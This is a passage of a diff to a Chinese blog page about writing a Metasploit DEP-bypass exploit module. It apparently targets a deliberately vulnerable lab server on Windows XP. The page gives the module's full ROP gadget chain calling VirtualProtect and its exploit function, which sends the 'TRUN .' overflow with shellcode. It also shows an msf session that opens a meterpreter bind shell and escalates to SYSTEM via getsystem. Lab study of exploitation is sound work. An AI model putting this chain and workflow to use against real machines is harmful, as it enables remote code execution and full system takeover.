class="string">&#x27;BadChars&#x27;</span>  =&gt; <span class="string">&quot;\x00&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">       <span class="string">&#x27;Targets&#x27;</span>      =&gt; </span><br><span class="line">        [</span><br><span class="line">          [<span class="string">&#x27;Windows XP&#x27;</span>, &#123;<span class="string">&#x27;Offset&#x27;</span>  =&gt; <span class="number">2006</span>&#125;]</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;DisclosureDate&#x27;</span>  =&gt; <span class="string">&#x27;2021-09-26&#x27;</span>))</span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">Opt</span><span class="symbol">:</span><span class="symbol">:RPORT</span>(<span class="number">9999</span>)</span><br><span class="line">      ],<span class="variable language_">self</span>.<span class="keyword">class</span></span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">create_rop_chain</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets =</span><br><span class="line">    [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x77c2d7ba</span>,  <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x6250609c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span></span><br><span class="line">      <span class="number">0x7e41927f</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]</span></span><br><span class="line">      <span class="number">0x7c94d192</span>,  <span class="comment"># XCHG EAX,ESI # RETN [ntdll.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x77c42f04</span>,  <span class="comment"># POP EBP # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x625011c7</span>,  <span class="comment"># &amp; jmp esp [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x77c4e0da</span>,  <span class="comment"># POP EAX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x7e44493b</span>,  <span class="comment"># NEG EAX # RETN [USER32.dll]</span></span><br><span class="line">      <span class="number">0x77f301e4</span>,  <span class="comment"># XCHG EAX,EBX # RETN [GDI32.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x7c87f229</span>,  <span class="comment"># POP EAX # RETN [kernel32.dll]</span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x77eda3d7</span>,  <span class="comment"># NEG EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">      <span class="number">0x77c58fbc</span>,  <span class="comment"># XCHG EAX,EDX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x77c1f519</span>,  <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x62504d79</span>,  <span class="comment"># &amp;Writable location [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x77c46116</span>,  <span class="comment"># POP EDI # RETN [msvcrt.dll]</span></span><br><span class="line">      <span class="number">0x77e8d224</span>,  <span class="comment"># RETN (ROP NOP) [RPCRT4.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x77ead9ed</span>,  <span class="comment"># POP EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x77dfc5ee</span>,  <span class="comment"># PUSHAD # RETN [ADVAPI32.dll]</span></span><br><span class="line">    ].flatten.pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop_gadgets</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">    connect</span><br><span class="line">    rop_chain=create_rop_chain()</span><br><span class="line">    junk=rand_text_alpha_upper(target[<span class="string">&#x27;Offset&#x27;</span>])</span><br><span class="line">    buf=<span class="string">&quot;TRUN .&quot;</span>+junk+rop_chain+make_nops(<span class="number">16</span>)+payload.encoded+<span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">    sock.put(buf)</span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 <h3 id="保存路径">2、保存路径</h3>
-<pre><code>    root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test# ls
-    **dep_attack_by_z9m8r8.rb**  seh_attack_by_z9m8r8.rb</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test<span class="comment"># ls</span></span><br><span class="line">dep_attack_by_z9m8r8.rb  seh_attack_by_z9m8r8.rb</span><br></pre></td></tr></table></figure>
 <h3 id="简要解析">3、简要解析</h3>
 <p><strong>exploit函数</strong></p>
 <ul>
@@ -488,56 +336,10 @@ Metasploit 渗透模块</h2>
 <li>再将一些填充数据和ShellCode添加到buf变量中</li>
 </ul>
 <h3 id="代码调试">4、代码调试</h3>
-<pre><code>**root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test #** **../../../../tools/dev/msftidy.rb dep_attack_by_z9m8r8.rb** 
-    dep_attack_by_z9m8r8.rb - [INFO] No CVE references found. Please check before you land!
-    dep_attack_by_z9m8r8.rb - [ERROR] Unable to determine super class　　#未解决（super()看了好几遍没发现有什么问题），但msf中依旧可渗透成功！
-    dep_attack_by_z9m8r8.rb:19 - [WARNING] Spaces at EOL</code></pre>
-<h2 id="四msf-运行测试">四、msf 运行测试</h2>
-<pre><code>**msf5 &gt; use exploit/windows/z9m8r8_test/dep_attack_by_z9m8r8 
-    msf5 exploit(windows/z9m8r8_test/dep_attack_by_z9m8r8) &gt; set payload windows/meterpreter/** **bind_tcp**
-    payload =&gt; windows/meterpreter/bind_tcp
-    **msf5 exploit(windows** **/z9m8r8_test/dep_attack_by_z9m8r8) &gt;** **show options** 
-    
-    Module options (exploit/windows/z9m8r8_test/dep_attack_by_z9m8r8):
-    
-       Name    Current Setting  Required  Description
-       ----    ---------------  --------  -----------
-       RHOSTS                   yes       The target address range or CIDR identifier
-       RPORT   9999             yes       The target port (TCP)
-    
-    
-    Payload options (windows/meterpreter/bind_tcp):
-    
-       Name      Current Setting  Required  Description
-       ----      ---------------  --------  -----------
-       EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
-       LPORT     4444             yes       The listen port
-       RHOST                      no        The target address
-    
-    
-    Exploit target:
-    
-       Id  Name
-       --  ----
-       0   Windows XP
-    
-    
-    **msf5 exploit(windows** **/z9m8r8_test/dep_attack_by_z9m8r8) &gt; set rhost 10.10.10.131**
-    rhost =&gt; 10.10.10.131 **msf5 exploit(windows /z9m8r8_test/dep_attack_by_z9m8r8) &gt;** **exploit** 
-    
-    [*] Started bind TCP handler against 10.10.10.131:4444
-    [*] Sending stage (179779 bytes) to 10.10.10.131
-    [*] Meterpreter session 1 opened (10.10.10.149:40241 -&gt; 10.10.10.131:4444) at 2021-09-26 07:06:01 -0400 **meterpreter &gt;** **getuid** 
-    Server username: DH-CA8822AB9589\Administrator
-    **meterpreter** **&gt;** **getsystem** 
-    ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
-    **meterpreter** **&gt;** **getuid** 
-    Server username: NT AUTHORITY\SYSTEM
-    meterpreter &gt; 
-    </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test <span class="comment">#../../../../tools/dev/msftidy.rb dep_attack_by_z9m8r8.rb </span></span><br><span class="line">    dep_attack_by_z9m8r8.rb - [INFO] No CVE references found. Please check before you land!</span><br><span class="line">    dep_attack_by_z9m8r8.rb - [ERROR] Unable to determine super class　　<span class="comment">#未解决（super()看了好几遍没发现有什么问题），但msf中依旧可渗透成功！</span></span><br><span class="line">    dep_attack_by_z9m8r8.rb:19 - [WARNING] Spaces at EOL</span><br></pre></td></tr></table></figure>
+<h2 id="msf-运行测试">4. msf 运行测试</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/z9m8r8_test/dep_attack_by_z9m8r8 </span><br><span class="line">    msf5 exploit(windows/z9m8r8_test/dep_attack_by_z9m8r8) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">    payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">    msf5 exploit(windows/z9m8r8_test/dep_attack_by_z9m8r8) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (exploit/windows/z9m8r8_test/dep_attack_by_z9m8r8):</span><br><span class="line">    </span><br><span class="line">       Name    Current Setting  Required  Description</span><br><span class="line">       ----    ---------------  --------  -----------</span><br><span class="line">       RHOSTS                   <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT   9999             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Payload options (windows/meterpreter/bind_tcp):</span><br><span class="line">    </span><br><span class="line">       Name      Current Setting  Required  Description</span><br><span class="line">       ----      ---------------  --------  -----------</span><br><span class="line">       EXITFUNC  process          <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">       LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line">       RHOST                      no        The target address</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Exploit target:</span><br><span class="line">    </span><br><span class="line">       Id  Name</span><br><span class="line">       --  ----</span><br><span class="line">       0   Windows XP</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    msf5 exploit(windows/z9m8r8_test/dep_attack_by_z9m8r8) &gt; <span class="built_in">set</span> rhost 10.10.10.131</span><br><span class="line">    rhost =&gt; 10.10.10.131 msf5 exploit(windows /z9m8r8_test/dep_attack_by_z9m8r8) &gt;exploit </span><br><span class="line">    </span><br><span class="line">    [*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.131:4444</span><br><span class="line">    [*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">    [*] Meterpreter session 1 opened (10.10.10.149:40241 -&gt; 10.10.10.131:4444) at 2021-09-26 07:06:01 -0400 meterpreter &gt;getuid </span><br><span class="line">    Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">    meterpreter&gt;getsystem </span><br><span class="line">    ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">    meterpreter&gt;getuid </span><br><span class="line">    Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">    meterpreter &gt;   </span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128162045594-1361922937.png" /></p>
-<h2 id="五参考文献">五、参考文献</h2>
-<p><strong>《精通Metasploit渗透测试》</strong></p>
 
     </div>
 
@@ -615,7 +417,7 @@ Metasploit 渗透模块</h2>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:13</span>
+    <span title="站点阅读时长">10:14</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
